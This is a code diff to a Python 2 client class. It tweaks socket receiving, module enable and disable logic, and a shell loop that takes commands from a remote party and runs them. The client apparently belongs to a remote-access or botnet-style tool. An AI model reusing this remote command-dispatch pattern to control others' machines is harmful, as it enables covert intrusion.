@@ -220,12 +220,13 @@ class Client(object):
     def _receive(self):
         try:
             data = ""
-            self._socket.setblocking(False) if self.standby.status else self._socket.setblocking(True)
+            self._socket.setblocking(False) if self.standby.status.is_set() else self._socket.setblocking(True)
             while "\n" not in data:
                 try:
                     data += self._socket.recv(1024)
                 except socket.error: return
             data = self._decrypt(data.rstrip()) if len(data) else data
+            print data
             return data
         except Exception as e:
             if self.__v__:
@@ -337,15 +338,21 @@ class Client(object):
 
     def _enable(self, module):
         try:
-            getattr(self, module).im_func.status = True
-            return "{} enabled.".format(module.title())
+            if type(getattr(self, module).im_func.status) is bool:
+                getattr(self, module).im_func.status = True
+            elif hasattr(getattr(self, module).im_func.status, 'clear'):
+                getattr(self, module).im_func.status.set()
+            return "'{}' enabled.".format(str(module))
         except Exception as e:
             return "Error: {}".format(str(e))
 
     def _disable(self, module):
         try:
-            getattr(self, module).im_func.status = False
-            return "{} disabled.".format(module.title())
+            if type(getattr(self, module).im_func.status) is bool:
+                getattr(self, module).im_func.status = False
+            elif hasattr(getattr(self, module).im_func.status, 'clear'):
+                getattr(self, module).im_func.status.clear()
+            return "'{}' disabled.".format(str(module))
         except Exception as e:
             return "Error: {}".format(str(e))
 
@@ -421,7 +428,7 @@ class Client(object):
             
     def _show(self, target):
         try:
-            results = json.dumps(target, indent=2, separators=(',','\ti'), sort_keys=True)
+            results = json.dumps(target, indent=2, separators=(',','\t'), sort_keys=True)
         except:
             try:
                 string_repr = repr(target)
@@ -541,16 +548,13 @@ class Client(object):
 
     def _shell(self):
         self.standby.status.clear()
-        print 'standby mode off'
         self.shell.status.set()
-        print 'shell mode on'
         while True:
             self.shell.status.wait()
             prompt = "[%d @ {}]> ".format(os.getcwd())
+            print prompt
             self._send(prompt, method='prompt')   
             data = self._receive()
-            if not data:
-                continue
             cmd, _, action = bytes(data).partition(' ')
             if cmd in self._commands:
                 result = self._commands[cmd](action) if len(action) else self._commands[cmd]()
@@ -1064,7 +1068,7 @@ class Client(object):
 
     @_command
     def status(self):
-        """get client session status"""
+        """\tget client session status"""
         return self._status()
 
     @_command
